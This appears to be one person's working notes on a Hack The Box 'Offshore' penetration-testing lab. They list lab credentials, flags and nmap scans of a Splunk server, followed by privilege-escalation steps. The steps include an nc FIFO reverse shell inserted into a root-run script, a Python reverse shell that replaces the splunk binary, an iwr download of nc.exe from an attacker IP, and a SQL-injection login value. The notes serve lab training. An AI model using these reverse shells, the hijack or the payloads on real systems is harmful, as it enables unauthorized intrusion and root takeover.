# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 
- IP: 

# Findings
### Credentials
1. ` ned.flanders_adm : Lefthandedyeah! `
2. ` wsadmin : Workstationadmin1!`
3. ` svc_iis : Vintage!`

### Flags
1. `OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}`
2. `OFFSHORE{st0p_tai1ing_m3_br0}`
3. `OFFSHORE{RC3_a$_@_s3rv1c3}`
4. `OFFSHORE{l0v3_cl3artext_pr0toc0l$}`
5. `OFFSHORE{p@ssw0rds_1n_cl3ar_t3xT}`
6. `OFFSHORE{4t_y0ur_5erv1ce}`
7. `OFFSHORE{mimikatz_d03s_th3_j0b}`
8. `OFFSHORE{hmm_p0tato3s}`
9. `OFFSHORE{cm0n!_an0th3r_sqli!?}`
10. 

### Machines
![](https://i.imgur.com/mItfIBr.png)
![](https://i.imgur.com/BkagAR4.png)
1. [[CTF Notes/HTB/Offshore/External/FootHold - NIX01]]    -   1
2. [[SQL01]]
3. [[WEB-WIN01]] - Hope
4. [[DC01]]
5. [[MS01]] - 2
6. [[FS01]]
7. [[WS02]] - 4
8. [[WSADM]] - 3
9. [[JOE-LPTP]]
10. [[SRV01]]  - offshore.local
11. [[DC0]]  - offshore.local
## External
### Enumeration
```shell
~/C/H/P/Offshore > 10.10.17.52 $ nmap 10.10.110.0/24 -sn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 08:45 EAT
Nmap scan report for 10.10.110.2
Nmap scan report for 10.10.110.3
Nmap scan report for 10.10.110.123
Nmap scan report for 10.10.110.124
Nmap done: 256 IP addresses (4 hosts up) scanned in 16.04 seconds
```
#### `10.10.110.123`
```
Nmap scan report for 10.10.110.123
Host is up, received echo-reply ttl 62 (0.13s latency).
Scanned at 2024-07-02 08:49:28 EAT for 90s
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ed:da:93:ee:2e:2b:7a:02:4d:97:3d:1b:f2:40:ba:f6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2Dy3kztjDhz66aRIvAbMvUxDtbn5qEfkE9IjRDdlK92iRXnMR0GQIadYmaLrVe8xldeuHJv1ZYT5WAR84Csrrz9zPYldtRqrYQCEHrJtjuhs2PhwWde/zQM5E3XkwEz14MaGgipLlzP6qKjhXEPuOTXLgYs3bFQR1ylJK4TO3TLR+fL5KHp8hBm0UcgyFsAIcgJ0StEEBILpi6vz9wQKkgFKkNdI0j8uh2invCc8s6dCtgySpEVt3cERsackAmSh2UCbg5dgX27U1aiXERrnKunyq0tLxK+0ZEPUa71nmLA8AO1T3KJTF+EUsqE0egS6j32jga2CR/WBeZB8nNunB
|   256 7e:de:fa:0c:9d:4c:6c:01:7c:0a:0c:f1:74:4d:f3:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBjQQc098ueAsYSxV4zZw0QBUmenLsuhuEH4p5QB1bhnEDcSoKgNdXSw9055D0f3U8R7jX9Key7eu1iRzY7XnSk=
|   256 15:ab:fc:b8:a2:fa:f1:57:d7:3f:bc:ab:ad:d0:cc:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMw1Q1IycVY7iV1vnDakUaVy3f3ICD1UBDWR0IjlxOQt
80/tcp   open  http     syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: ACME Bank
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
8000/tcp open  http     syn-ack ttl 62 Splunkd httpd
|_http-favicon: Unknown favicon MD5: 28325D0DE04908D350C47DD30AE26CB2
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.110.123:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
8089/tcp open  ssl/http syn-ack ttl 62 Splunkd httpd (free license; remote login disabled)
|_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-02-02T20:26:16
| Not valid after:  2021-02-01T20:26:16
| MD5:   f181:50f9:e5a1:39a8:0d47:bcff:5a68:64ec
| SHA-1: b2d3:fdf6:fc1d:b9de:2b8b:8f56:8601:b697:c962:4924
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCObldSwd4kkzANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0xODAyMDIyMDI2MTZaFw0yMTAyMDEyMDI2
| MTZaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvpvJ
| RbGYob3S1ydFKnZ7/nM92lUPBorlFIfFaqf/eTTeaZParWB1LJUvcF7gppgoUW8J
| 1cnDvaIz50USmjFQl16g3k8p+4ghqs1fW7eoEduyy4ryNhUG5t4WN7V/Dp0mCz46
| N/56WyT7GXGVr04/X8kTx8OPYj5rUUHHN4Vsn7PKkxlfTbYZ9KRtMmbNNJYljk2n
| +BnvV+SSY31BMK/05QRVyECwzmqow+OnbnZst05d9BJK+DasIJDUmIJ4htqjB1Ke
| h3v6WUtzSh4B++awHnBFpDkhVj7M++lkabO/BZSyTE2jXcwwrjwrc9arUU6E0aOn
| 62Win/PqkieGaJb3WQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQDL+zEDoCAcHY2l
| p0q4yaPdbJZIltDvHjb6zfvVrFM7+tTQvRqWA9AmQT9oQzm86RJnd5b2IHdrW9h/
| RJlK3nZ0xe0VVdspiwf+eD2VPlBKnGmxEoE2A99nwDcg0UQ8q0Ink4RKbNcV5YaJ
| 7UdLIDPMbOkxzzrvGMeuH9fTWrA0ZPnDxgH2RfcOZY08NtxWLtBcwboy3zg7F2Sw
| 6KTNhfHfYm82WbLxjx3+HxFSk9zCP+1Tg/HqyY5kMTvMxLTRzmoT6IUdQhb2kGwj
| q4ZmSQ7X49S3rJkPe++Qivyd/xFFUFFCFPmWZEPx9sjyQOHlTvL3/lFR4LFY24iu
| yVhAI9dJ
|_-----END CERTIFICATE-----
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Port 80 is Empty, except some users name.
- on port 8000 there is no splunk authentication
![](https://i.imgur.com/1OWgueO.png)
- Then i got shell
#### `10.10.110.124`
![](https://i.imgur.com/WZWBUq4.png)

### Gaining Access
![](https://i.imgur.com/NUfbnSj.png)
## Internal
### Enumeration
![](https://i.imgur.com/rwJ1CRy.png)
```c
/opt/splunk/etc/passwd
splunk binary was found installed on /opt/splunk/bin/splunk

/var/www/html/

postgres

You own the script: /opt/splunk/bin/genRootCA.sh
You own the script: /opt/splunk/bin/genWebCert.sh
You own the script: /opt/splunk/bin/pid_check.sh
You own the script: /opt/splunk/bin/genSignedServerCert.sh
/usr/local/sbin/splunk-check.sh

/home/mark/.psql_history
/home/mark/.wget-hsts

/opt/splunk/lib/python2.7/site-packages/splunk/appserver/mrsparkle/root.py

cp rex /opt/splunk/bin/pid_check.sh

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
You have write privileges over /etc/ld.so.conf.d/libc.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
  - /usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/opt/splunk/var/log/splunk/audit.log
/opt/splunk/var/log/splunk/conf.log


-r--r--r-- 1 mark mark 325 Jan 25  2018 /opt/splunk/etc/modules/input/exec/config.xml
-r--r--r-- 1 mark mark 339 Jan 25  2018 /opt/splunk/etc/modules/input/FIFO/config.xml
-r--r--r-- 1 mark mark 579 Jan 25  2018 /opt/splunk/etc/modules/input/fschangemanager/config.xml
-r--r--r-- 1 mark mark 1509 Jan 25  2018 /opt/splunk/etc/modules/input/stashparsing/config.xml
-r--r--r-- 1 mark mark 1178 Jan 25  2018 /opt/splunk/etc/modules/input/structuredparsing/config.xml
-r--r--r-- 1 mark mark 787 Jan 25  2018 /opt/splunk/etc/modules/input/tailfile/config.xml
-r--r--r-- 1 mark mark 729 Jan 25  2018 /opt/splunk/etc/modules/input/TCP/config.xml
-r--r--r-- 1 mark mark 397 Jan 25  2018 /opt/splunk/etc/modules/input/UDP/config.xml
-r--r--r-- 1 mark mark 272 Jan 25  2018 /opt/splunk/etc/modules/internal/scheduler/config.xml
-r--r--r-- 1 mark mark 4135 Jan 25  2018 /opt/splunk/etc/modules/parsing/config.xml


```
![](https://i.imgur.com/dA946Zz.png)
![](https://i.imgur.com/xHhpGUB.png)
![](https://i.imgur.com/7aLHwfW.png)

- This web script will reboot the splunk
```php
<?php

if (isset($_GET['reboot']) && $_GET['reboot'] == 1) {
   echo shell_exec('sudo /sbin/reboot');
}
?>
<html>
<head>
</head>
<body>
<h1>Reboot server</h1>
<p>If the splunk instance is crashed use the link below to issue a reboot of the VM</p>
<p style="color: red"><b>Warning:</b> This is not part of Offshore challenge, it is a way to recover a known issue</p>
<br>
<br>
<h3><a href="z">Reboot Server</a></h3>
```
![](https://i.imgur.com/S8SkRax.png)
- I tried it and it made the server restart. so am planning the change the splunk binary and restart the pc
```sh
(remote) mark@NIX01:/$ ls -la /opt/splunk/bin/splunk
-r-xr-xr-x 1 mark mark 477904 Jan 25  2018 /opt/splunk/bin/splunk
(remote) mark@NIX01:/$ mv /opt/splunk/bin/splunk /opt/splunk/bin/splunk.BAK
(remote) mark@NIX01:/$ mv /tmp/evil /opt/splunk/bin/splunk
```
![](https://i.imgur.com/JUgj9Bn.png)
/opt/splunk/bin/splunk
```shell
(remote) mark@NIX01:/tmp$ cat /usr/local/sbin/splunk-check.sh
# Ippsec's Splunk Monitoring Script

splunk_home=/opt/splunk

splunk_err=$(tail $splunk_home/var/log/splunk/splunkd.log | grep -a 'Read Timeout while connecting')

restart_splunk=0



if [[ ! -z "$splunk_err" ]]; then

    restart_splunk=1

    echo "$(date +"%y/%m/%d-%H:%M") - Believe Splunk is unresponsive, restarting" >> /root/splunk.log

    fi



for bad_app in $(find $splunk_home -name terminal.xml | awk -F\/ '{print $(NF-5)}'); do

    if pgrep -x "splunkd" > /dev/null; then

        $splunk_home/bin/splunk stop

        fi
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.248 1003 >/tmp/f
    $splunk_home/bin/splunk remove app $bad_app

    echo "$(date +"%y/%m/%d-%H:%M") - Terminal.xml found, removing app $bad_app" >> /root/splunk.log

    restart_splunk=1

    done



if [ "$restart_splunk" -eq "1" ]; then

    $splunk_home/bin/splunk restart

    fi
```
the `$splunk_home/bin/splunk` is writeable by mark so i changed that shell with python rev shell so, when the ippsecs script run it will call it and i will have revshell
### Gaining Access
```shell
powershell -c iwr http://10.10.14.2/nc.exe -outfile nc.exe
(remote) mark@NIX01:/$ cat /opt/splunk/bin/splunk
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",2202));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
(remote) mark@NIX01:/$ ls -la /opt/splunk/bin/splunk
-rwx--x--- 1 mark mark 226 Jul  2 15:52 /opt/splunk/bin/splunk

mkdir -p /opt/splunk/test1/test2/test3/test4/test5/terminal.xml

```
![](https://i.imgur.com/DO64BPq.png)
![](https://i.imgur.com/hIew9k1.png)
![](https://i.imgur.com/FsTwK4a.png)
`j_username=admin%27&j_password=644c9c39f63813fc`
![](https://i.imgur.com/MdgLG9w.png)
- The previous one is not working
	- `EncryptPassword=Zaq12wsx!&userName=admin`
- This Has an ip of [[MS01]]
### Maintaining Access

![](https://i.imgur.com/0w8Pior.png)



# Random Notes